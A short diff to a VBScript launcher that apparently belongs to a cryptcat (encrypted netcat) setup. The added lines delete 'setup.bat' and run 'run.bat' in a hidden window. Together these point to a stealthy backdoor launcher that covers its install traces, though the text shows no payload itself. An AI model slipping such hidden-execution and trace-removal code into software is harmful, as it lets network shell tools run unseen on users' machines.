@@ -1,3 +1,6 @@
 Set WshShell = CreateObject("WScript.Shell") 
-WshShell.Run chr(34) & "C:\Users\neyul\Desktop\cryptcat\run.bat" & Chr(34), 0
+dim filesys
+Set filesys = CreateObject("Scripting.FileSystemObject")
+filesys.DeleteFile "setup.bat"
+WshShell.Run chr(34) & "run.bat" & Chr(34), 0
 Set WshShell = Nothing
